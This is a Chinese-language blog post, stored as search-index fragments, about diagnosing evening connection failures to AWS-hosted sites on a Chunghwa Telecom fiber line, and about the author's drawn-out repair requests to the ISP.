","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:0:0","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"心智圖 mindmap root(中華電信網路連不到特定網站) 網路問題狀況 排查問題過程 Down for Everyone or Just Me 尋找網站相同服務商方法 重取 IP id)中華 Source IP 問題( 試試重取 IP 報修方式 DR. Speed Hinet 做 TraceRoute 中華電信報修 自己報修過程 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:1:0","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"發現事情不對勁 之前有遇過 cnblog.com 連不到問題，當下有重新上網取得新的 IP 就能用了。一直以為是跟網站有關係，但是沒辦法連到網站。前正子因為想線上跟別人玩馬力歐賽車，所以我買 NSO 會員，但我發現有時候 NSO 沒法連到，我一直以為是老任的問題，有時候還常常網路遇到斷線問題。最近 Github Gist 常常上傳圖片發生錯誤，我就覺得不太對勁。畢竟 Github 被微軟爸爸買下來，他們網站都是有做備援機制，應該不會遇到問題。當下疑似github-production-user-asset-6210df.s3.amazonaws.com 沒回傳到 Response 資料。當下看 DNS 取出東西是多組 IP，無法確定是哪一個 IP 造成問題。最近買新電腦裝 foobar2000 聽音樂程式，發現網站連不到??我手機網路是可以連的，因為我朋友也是用中華電信，我請他幫我看他 Tracert IP 可以正常到達，我的網路是不行的。發現晚上8點左右到12點都會連不到網站，之後就莫名其妙就好了，之前沒特別記錄發生時間，後續維修排查被我發現固定時間會這樣。 我的 TraceRoute 他的 TraceRoute ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:2:0","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"排查問題方法 因為我朋友有送我 Fortigate ，有把中華小烏龜 DHCP 設定關掉，這邊 DHCP 由 Fortigate，原因我有架設 AdGuard ，中華電信無法 DHCP 派送 DNS，所以我後來就把這個關掉。 建議測試盡量排除其他網路設備，測試排除測試小烏龜上面，不然中華電信會以為是你的設備的問題。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:3:0","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"設定固定 IP, Gateway IP, DNS 一般網路環境應該沒有像我家這麼複雜，你可能就直接把你電腦接到小烏龜，假如你還有一些設備可能要調整一些電腦設定。 這邊我有請教我懂網路朋友，這邊他有教我不影響現有設備設定方法。只要設定以下 固定 IP (設定小烏龜同網域) Gateway IP (直接指向小烏龜，我預設指向 Fortigate) DNS (中華電信 DNS，我預設置指定家裡的) 這些設定就能連到對外網路，不用調整其他網路。 現有 DHCP 取得網路。 去控制台設定網路卡 IP，這邊設定電腦網路會中斷，這邊要注意一下。 This is a tip 第一天中華電信員工，看到我小烏龜關掉 DHCP Server。他說我關掉無法試?但其實正常是可以的，設定固定 IP 就能做到。 之後設定回來，可以用飛航模式，這邊會清除 DNS 紀錄，不會吃到舊的 DNS 解析結果。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:3:1","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"Down for Everyone or Just Me 如果沒有人可以幫你看網站能不能連，可以參考用這個東西。輸入網址就能知道能不能連，但不能連有很多種可能，也有可能某網站只能連台灣 IP 。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:3:2","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"尋找網站相同服務商方法 我找一些相同服務商方法 www.foobar2000.org github-production-user-asset-6210df.s3.amazonaws.com i.imgur.com mirrored.to amazonaws.com who.is www.shopshopjob.com 怎麼找相關不能連網站? 我在這個網站可以找到相關服務網站M247 - Who Hosts This Site?，可以把相關不能連網址用這個搜尋，可以找到相關不能連的網站。 NSO Switch app-a04.lp1.npns.srv.nintendo.net連不到，應該也是 AWS 服務。我發現不只這幾個網站可以連。 嚴重掉ping: cnblogs.com ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:3:3","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"重取 IP 重開中華電信小烏龜，可以取得新 IP。這邊建議重開 3 次都不行的話，可能就要繼續往下看原因。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:3:4","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"BRAS 分配 中華 Source IP 問題(問題所在) 因為我朋友覺得很奇怪，他這邊有叫我申請固定 IP 去做更換。因為有機會換到不同 BRAS 或者不同網段 IP，我用固定 IP 就能解決這個問題，但正常浮動應該可以連才對。 我用中華電信固定IP 可以連到相關網站，這邊不知道中華電信路由怎麼設定的，反正假如你跟我一樣狀況可以繼續往下看。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:3:5","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"查看 Hinet BRAS 可以進去連結，登入可以看到自己相關 BRAS 位置。 相關連結:[問題] 中華電信 不同BRAS？讓您輸在起跑點？ - 看板Broad_Band - PTT網頁版 到這邊就能知道是路由問題，這邊準備可以做報修動作。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:3:6","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"報修方式 因為我報修浪費一些時間，這邊我直接說明報修方式，不浪費大家時間。這邊我有用 MTR 方式去測試，但中華電信他們不會看這些東西，需要用DR. Speed Hinet 測速軟體。 相關 MTR可以看，中間有 loss %的不用太緊張，需要中間到後面 loss 才要擔心，請參考下圖。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:4:0","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"DR. Speed Hinet TraceRoute 下載DR. Speed Hinet 測速軟體 Shift + 左鍵點同意，會跳出 TraceRoute工具。 我這邊畫面怪怪，我朋友 Win 10電腦是正常的。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:4:1","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"Win 11 Bug，無法做 TraceRoute? 客服教我用的時候，我找不到開始測試按鈕。好在我憑我程式開發直覺，直接按下 Enter 可以順利執行…，不然我可能要和客服卡在這邊不能進行測試。😒 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:4:2","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"報修很差的體驗🔥 Tip 可能要換 ISP? 查詢這篇看到有人也遇到，當下他的 Blog 也無法連。 OK，看得出來此IP是誰的嗎！？請自行把英文翻譯成中文，意思是最後一個接手的人是ISP:HiNET。所以這樣就代表是HINET往下一個地方去的節點斷掉了。當然HINET還是可以說是下一個人的問題啊。當你等連線正常後，去找尋下一個位置是誰，大概就可以找出中斷點了。 耶～找到了，然後呢～沒有然後了，有本事你就換家吧。 開始考慮想用第四台網路。收費又貴，網路又慢，又遇到這個鳥問題…。真的是可以考慮，聽說這個問題，可以要求他們免退合約租金要求退租。 這種報修真的很麻煩，最後差點要換 ISP了。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:5:0","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"第一次報修 因為想用網路報修，所以用帳號進行 HN 帳號綁定花了一堆時間，不過最後終於成功。但我這邊建議用電話報修可能會比較方便。 隔一天中華電信師傅看到我問題，覺得這個應該是路由問題，這邊他來這邊沒什麼意義。不過後來他好像說我訊號不穩有過來檢查，最後看到說我 MTR 可能要其他單位(長官)處理，叫我自己打給客服。 This is a tip 這邊建議叫你自己打給客服，這邊建議請師傅自己幫你轉單給客服，不然轉錯單又會浪費很多時間。 當天晚上 8 點多我又遇到相關網站不能連，這邊打給中華電信 0800-000-412。他這邊叫我用 DR. Speed Hinet TraceRoute，我還不知道內建工具藏個 MTR 工具，最後上傳資料會到中華電信上面。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:5:1","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"第二天報修 因為我第二天上班，師傅又說單子怎麼又派到他們這邊。說他這邊也看不到我 TraceRoute 紀錄，因為我今天不在家，所以就沒辦法來看。 晚上我又遇到 TraceRoute，順便打給客服，有問問客服說我又遇到問題，TraceRoute 連網站都不到，有用他們中華電信工具上傳測試報告，他們說有收到，會幫我派工程師過來看，我有跟他確認不會派同一個工程師過來處理，這邊可以安心，因為228連假也快到了。還有一點不爽，問題沒有解決，客服還想推銷行銷方案，我都不是很爽。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:5:2","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"第三天(嘴砲模式💥) 結果今天來也是第一天過來工程師，這邊他們來網路都是正常的，說 TraceRoute 東西叫我寄信過去，叫我自己打給客服。我說這個東西不應該我處理，應該要讓你們自己轉給正確單位，不然最後單子右轉給你們這邊，不是一直很浪費時間。師傅就馬上打給客服，說我這個狀況不是打給她們單位處理，這邊說一定還要再回電給我讓我知道，他這邊還說兩次。當天下午快5點多我還沒收到，我就有點火，打給文字客服去問狀況，客服還說會派師傅到我這邊，我就生氣回「路由問題來我這邊能解決嗎？」，後來才發現我這兩天花 4 個小時 TraceRoute 測試報告他們還沒請工程師看狀況，這邊我就開起嘴砲模式，這邊就不詳細說了，剛好要放四天連假，沒有人可以幫我處理。 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:5:3","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"連假某一天把 Prometheus 加上 網域觀察 ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:5:4","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"第二次報修回覆 這邊收到中華電信客服回覆「海纜障礙影響尖峰連外品質」，這邊我主要回應三點。 當下我中華電信浮動 IP 無法連 AWS, foobar2000 網站，但我朋友家中華電信光世代無此問題，以上 「海纜障礙影響當下路由阻塞」不成立。(重開多次小烏龜重取浮動IP也無法連 AWS, foobar2000 ) 當下我的中華電信浮動IP連不到 AWS, foobar2000 網站，這邊用之前申請固定IP帳號，取得固定IP是可以連 AWS, foobar2000 網站，以上 「海纜障礙影響當下路由阻塞」不成立。 「海纜障礙影響當下路由阻塞」如果大家中華電信用戶連不到的話，這個說法我能接受。但重點我手機、我朋友、我固定IP卻不會有這個問題，這個說法我無法接受。 當下客服也無法反駁我的見解，這邊我說我回去寫信做回應。當下回去看系統報修狀態是關閉，有再打電話去罵，不過客服說路由狀態問題不會在系統上面，這個問題他們那邊是有紀錄的，當然我還是有理性的，說明下我會準備通知紀錄。 Hi 中華電信: 我是XXX。 這次客服反映是「海纜障礙影響當下路由阻塞」，這邊我回覆有幾個重點，當下客服也無法反駁我的見解。 當下我中華電信浮動 IP 無法連 AWS, foobar2000 網站，但我朋友家中華電信光世代無此問題，以上 「海纜障礙影響當下路由阻塞」不成立。(重開多次小烏龜重取浮動IP也無法連 AWS, foobar2000 ) 當下我的中華電信浮動IP連不到 AWS, foobar2000 網站，這邊用之前申請固定IP帳號，取得固定IP是可以連 AWS, foobar2000 網站，以上 「海纜障礙影響當下路由阻塞」不成立。 「海纜障礙影響當下路由阻塞」如果大家中華電信用戶連不到的話，這個說法我能接受。但重點我手機、我朋友、我固定IP卻不會有這個問題，這個說法我無法接受。 我多次強調浮動Source IP，該路由傳送會有遺失，固定IP就沒有這個問題。已多次提出更換我這邊Source IP，但還是收到沒有解決，我朋友用中華光世代60M，但竟然沒遇到這個狀況， 我100M付的錢也比較多，別的ISP都這麼便宜，我這麼貴也無法得到好品質，是不是只能換 ISP才能解決這個問題? 這個問題存在很久了，之前遇到狀況以為都是網站那邊出問題。但是 Github 多次上傳功能都失敗(他們使用AWS雲端服務)，太多次讓我覺得這不可能是網站問題，讓我針對這個問題去探討。最後發現 調浮動Source IP，該路由傳送會有遺失，固定IP就沒有這個問題。 我最近搜尋相關問題，發現這篇也是跟我類似狀況，該貼文人也是基隆人。 該文章是1/13發生的事情，今日接到客服說過幾天會好，我不認為，因為這個現象已經很久了。我不知道貴單位是否認真查詢有什麼網站會造成這樣問題，我花了很多時間測試。發現很誇張的是 AWS 雲端服務網站連不到，我有每月付錢玩任天堂 NSO ，他們家應該也是AWS服務，導致該固定時間無法連線。該 AWS相關服務都會無法使用，如: Github Gist 無法上傳圖片(AWS) who.is (AWS) amazonaws.com (AWS官網) AWS這麼大間雲端空間，相關全球很多家都有用，我相信不可能出在雲端服務商，重點 當下我中華電信浮動 IP 無法連 AWS, foobar2000 網站，但我朋友家中華電信光世代無此問題。我的手機網路(中華電信)也都是可以連的。 當下我的中華電信浮動IP連不到 AWS, foobar2000 網站，這邊用之前申請固定IP帳號，取得固定IP是可以連 AWS, foobar2000 網站。 你們說電纜的問題，但我發現是 Source IP更換固定就能用了。 所以是不能解決我的 Source IP 嗎? ","date":"2023-03-31","objectID":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/:5:5","tags":["中華電信","光世代","網站連不到","任天堂連不到","中華電信報修"],"title":"排查中華電信光世代連不到特定網站問題與報修方式","uri":"/blog/posts/%E6%8E%92%E6%9F%A5%E4%B8%AD%E8%8F%AF%E9%9B%BB%E4%BF%A1%E5%85%89%E4%B8%96%E4%BB%A3%E9%80%A3%E4%B8%8D%E5%88%B0%E7%89%B9%E5%AE%9A%E7%B6%B2%E7%AB%99%E5%95%8F%E9%A1%8C%E8%88%87%E5%A0%B1%E4%BF%AE%E6%96%B9%E5%BC%8F/"},{"categories":["網路"],"content":"所以是不能解決我的 Source IP 嗎? 